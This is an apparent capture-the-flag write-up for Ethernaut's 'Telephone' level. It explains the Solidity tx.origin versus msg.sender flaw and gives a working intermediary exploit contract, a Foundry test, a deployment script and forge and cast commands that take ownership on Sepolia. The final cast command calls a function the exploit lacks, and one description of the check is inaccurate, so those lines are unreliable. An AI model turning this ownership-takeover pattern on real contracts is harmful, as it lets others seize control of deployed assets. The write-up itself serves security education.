## 👾 04. Telephone

<br>


  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/2e9c5331-74fe-4e8e-8be2-347e4a1caf9d">
</p>



<br>

### tl; dr

<br>

* in this challenge, we exploit the difference between solidity's global variables `tx.origin` and `msg.sender` to to *phish* with `tx.origin` and become `owner`.
    - `tx.origin` refers to the EOA that initiated the transaction (which can be many calls ago in the stack, and never be a contract), while `msg.sender` is the immediate caller (and can be a contract).
    - `tx.origin` is **[known for being generally vulnerable](https://blog.sigmaprime.io/solidity-security.html#tx-origin)**, and its use should be restricted to specific cases such as denying external contracts from calling the current contract (for instance, with a `require(tx.origin == msg.sender)`).

<br>

* fun fact, this type of vulnerability resembles web2's **cross-site request forgery (csrf)**. 
    - exactly a decade ago, when i was getting started in security research and csrf was still heavily in the wild, **[i wrote a modification of apache's `mod_security` to monitor for it](https://github.com/go-outside-labs/csrf)**. 
    - it's wild how the world has changed in 10 years...

<br>

```solidity 
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```


<br>

---

### discussion

<br>

* `Telephone()` contract is pretty simple. first, it declares a **state variable** called `owner` (state variables have values permanently stored in a contract storage):

<br>

```solidity
address public owner;
```

<br>

* then we have a constructor that defines that the EOA who deploys this contract is its `owner`:

<br>

```solidity
constructor() {
    owner = msg.sender;
}
```

<br>


* finally, we have a function to change the owner, which checks if the caller is not the owner to give the ownership. this function is our target, and to exploit it, we need to make sure that `tx.origin` and `msg.sender` are not the same:

<br>

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
}
```

<br>

* this can be done by creating an intermediary contract that makes a call to `Telephone()`. this is our exploit:

<br>

```solidity
contract TelephoneExploit {
    
    function run(Telephone level) public {
        level.changeOwner(msg.sender);
  }
}
```

<br>


----

### solution

<br>

* first, we test our solution at `test/04/Telephone.t.sol`:

<br>

```solidity
contract TelephoneTest is Test {

    Telephone public level = new Telephone();
    address hacker = vm.addr(0x1337); 

    function testTelephoneHack() public {

        vm.startPrank(hacker);
        assertNotEq(level.owner(), hacker);

        TelephoneExploit exploit = new TelephoneExploit();
        exploit.run(level);

        assertEq(level.owner(), hacker);
        vm.stopPrank();
    }
}
```

<br>

* by running:

<br>

```shell
> forge test --match-contract TelephoneTest -vvvv    
```



<br>

* once it passes, we submit the solution with `script/04/Telephone.s.sol`:

<br>

```solidity
contract Exploit is Script {

      address instance = vm.envAddress("INSTANCE_LEVEL4");
      address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
      Telephone level = Telephone(instance); 
      TelephoneExploit public exploit;
        
      function run() external {

            vm.startBroadcast(hacker);
            exploit = new TelephoneExploit();
            exploit.run(level);
            vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/04/Telephone.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>

----

### alternative solution with `cast`

<br>

* instead of relying on our deploying script, a second option is deploying the contract directly with:

<br>

```shell
> forge create src/04/TelephoneExploit.sol:TelephoneExploit --constructor-args <level address> --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

* note that we would have to slightly modify our exploit to create an instance of `Telephone` instead of receiving it as an argument (with `level`). something like this:

<br>

```solidity
interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneExploit {
    Telephone level;

    constructor(address _levelInstance) {
       level = Telephone(_levelInstance);
    } 
    
    function run() public {
        level.changeOwner(msg.sender);
  }
}
```

<br>

* to call the exploit, we run:

<br>

```solidity
> cast send <deployed address> "changeOwner()" --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

----



### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



